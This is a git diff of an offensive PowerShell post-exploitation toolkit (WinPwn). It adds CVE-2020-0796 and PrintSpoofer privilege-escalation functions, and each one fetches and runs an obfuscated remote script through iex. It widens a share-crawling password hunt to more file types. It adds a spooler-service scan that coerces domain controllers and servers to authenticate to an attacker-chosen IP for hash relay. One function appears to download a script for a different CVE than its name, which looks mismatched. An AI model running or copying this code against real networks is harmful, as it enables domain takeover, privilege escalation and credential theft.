@@ -609,8 +609,10 @@ __        ___       ____
         Write-Host -ForegroundColor Green '7. CVE-2019-1129/1130 - Race Condition, multiples cores needed - July 2019! '
 	    Write-Host -ForegroundColor Green '8. CVE-2019-1215 - September 2019 - x64 only! '
 	    Write-Host -ForegroundColor Green '9. CVE-2020-0683 - February 2020 - x64 only! '
-        Write-Host -ForegroundColor Green '10. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
-        Write-Host -ForegroundColor Green '11. Exit. '
+        Write-Host -ForegroundColor Green '10. CVE-2020-0796 - March 2020 - no bind shell! '
+        Write-Host -ForegroundColor Green '11. Juicy-Potato Exploit from SeImpersonate or SeAssignPrimaryToken to SYSTEM!'
+        Write-Host -ForegroundColor Green '12. PrintSpoofer - Abusing Impersonation Privileges on Windows 10 and Server 2019!'
+        Write-Host -ForegroundColor Green '13. Exit. '
         Write-Host "================ WinPwn ================"
         $masterquestion = Read-Host -Prompt 'Please choose wisely, master:'
 
@@ -625,10 +627,12 @@ __        ___       ____
             7{CVE-2019-1129}
 	        8{CVE-2019-1215}
 	        9{CVE-2020-0683}
-            10{juicypot}
+            10{cve-2020-0796}
+            11{juicypot}
+            12{printspoofer}
        }
     }
- While ($masterquestion -ne 11)
+ While ($masterquestion -ne 13)
 
 }
 
@@ -638,6 +642,18 @@ function testtemp
  {
     mkdir C:\temp
  }
+}
+
+function cve-2020-0796
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/cve-2020-0683.ps1')
+    cve-2020-0796-lpe
+}
+
+function printspoofer
+{
+    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/printspoof_interactive.ps1')
+    printspoof
 }
 
 function CVE-2020-0683
@@ -1322,7 +1338,7 @@ function passhunt
 	    foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
        }
@@ -1341,7 +1357,7 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
                 foreach ($line in $shares)
                 {
                     cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
                 } 
                                   
@@ -1352,7 +1368,7 @@ g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-WebRequest -Uri 'https://github.com/S3cur3Th1sSh1t/Creds/raw/master/exeFiles/passhunt.exe' -Outfile $currentPath\passhunt.exe
             cmd /c start powershell -Command "$currentPath\passhunt.exe -r '(password|passwort|passwd| -p | -p=| -pw |
- -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.inf,.reg,.cmd,.lo
+ -pw=|pwd)' -t .doc,.xls,.xml,.txt,.csv,.config,.ini,.vbs,.vbscript,.bat,.pl,.asp,.sh,.php,.inc,.conf,.cfg,.msg,.inf,.reg,.cmd,.lo
 g,.lst,.dat,.cnf,.py,.aspx,.aspc,.c,.cfm,.cgi,.htm,.html,.jhtml,.js,.json,.jsa,.jsp,.nsf,.phtml,.shtml;"
         }
 
@@ -1368,7 +1384,13 @@ function domainreconmodules
         License: BSD 3-Clause
     #>
     #Domain / Network Recon
+        [CmdletBinding()]
 
+    Param
+    (   
+        [Switch]
+        $noninteractive
+    )
 
 
  function generaldomaininfo{
@@ -1445,41 +1467,11 @@ function domainreconmodules
 	        rewires -LocalGroup RDP -Identity $env:Username -domain $domain  >> "$currentPath\DomainRecon\RDPAccess_Systems.txt" 
 	        }
             
-	    
-            function spoolvulnscan{
+
+
             
-	    	        Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
-                    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
-                    $domcontrols = spinster
-                    foreach ($domc in $domcontrols.IPAddress)
-                    {
-		    	try{
-                        if (spoolscan -target $domc)
-                        {
-                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
-                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
-                        }
-			}catch{Write-Host "Got an error"}
-                    }
-             $othersystems = "no"
-		    if (!$noninteractive){$othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'}
-            	    if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
-                    {
-		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
-		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
-			foreach ($acserver in $ActiveServers.dnshostname)
-                    	{
-				try{
-                        	if (spoolscan -target $acserver)
-                        	{
-                            		Write-Host -ForegroundColor Yellow 'Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now'
-                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
-                        	}
-				}catch{Write-Host "Got an error"}
-                    	}
-            }
                     
-	        }
+	        
 	                    pathcheck
     $currentPath = (Get-Item -Path ".\" -Verbose).FullName
     
@@ -1506,6 +1498,7 @@ __        ___       ____
         MS17-10 -noninteractive
         passhunt -domain $true
         GPOAudit
+        spoolvulnscan -noninteractive
         bluekeep -noninteractive
         printercheck -noninteractive
         RBCD-Check -noninteractive
@@ -1562,6 +1555,88 @@ __        ___       ____
     }
  While ($masterquestion -ne 19)
 }
+
+function spoolvulnscan
+{
+
+    [CmdletBinding()]
+
+    Param
+    (   
+        [Switch]
+        $noninteractive
+    )   
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/viewdevobfs.ps1')         
+	    Write-Host -ForegroundColor Yellow 'Checking Domain Controllers for MS-RPRN RPC-Service! If its available, you can nearly do DCSync.' #https://www.slideshare.net/harmj0y/derbycon-the-unintended-risks-of-trusting-active-directory
+        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/SpoolerScanner/master/SpoolerScan.ps1')
+        $domcontrols = spinster
+        foreach ($domc in $domcontrols.IPAddress)
+        {
+		   	try{
+                   if (spoolscan -target $domc)
+                   {
+                            Write-Host -ForegroundColor Yellow 'Found vulnerable DC. You can take the DC-Hash for SMB-Relay attacks now'
+                            echo "$domc" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
+                   }
+			   }
+               catch
+               {
+                    Write-Host "Got an error"
+               }
+        }
+        $othersystems = "no"
+		if (!$noninteractive)
+        {
+            $othersystems = Read-Host -Prompt 'Start MS-RPRN RPC Service Scan for other active Windows Servers in the domain? (yes/no)'
+        }
+        if ($othersystems -eq "yes" -or $othersystems -eq "y" -or $othersystems -eq "Yes" -or $othersystems -eq "Y")
+        {
+		    	Write-Host -ForegroundColor Yellow 'Searching for active Servers in the domain, this can take a while depending on the domain size'
+		    	$ActiveServers = breviaries -Ping -OperatingSystem "Windows Server*"
+		    	foreach ($acserver in $ActiveServers.dnshostname)
+                {
+				    try{
+                        	if (spoolscan -target $acserver)
+                        	{
+                            		Write-Host -ForegroundColor Yellow "Found vulnerable Server - $acserver. You can take the DC-Hash for SMB-Relay attacks now"
+                            		echo "$acserver" >> "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
+                        	}
+				        }catch{Write-Host "Got an error"}
+                }
+        }
+        if (!$noninteractive)
+        {
+             Write-Host -ForegroundColor Yellow "Relay hashes from all vulnerable servers?"
+             $answer = Read-Host
+        }
+        else
+        {$answer = "no"}
+        if ($answer)
+        {
+                  Write-Host -ForegroundColor Yellow "Please enter the hash capturing IP-Adress:"
+                  $captureip = Read-Host
+                  IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Spoolsample.ps1')
+                  if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt")
+                  {
+                          $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableDC.txt"
+                          foreach ($server in $servers)
+                          {
+                                Write-Host -ForegroundColor Yellow "Spool sampling $server"
+                                Invoke-SpoolSample -command "$server $captureip"
+                          }
+                      }
+                      if (test-path "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt")
+                      {
+                          $servers = get-content "$currentPath\Vulnerabilities\MS-RPNVulnerableServers.txt"
+                          foreach ($server in $servers)
+                          {
+                                Write-Host -ForegroundColor Yellow "Spool sampling $server"
+                                Invoke-SpoolSample -command "$server $captureip"
+                          }
+                      }
+        }
+}
+                    
 
 function GPORemoteAccessPolicy
 {
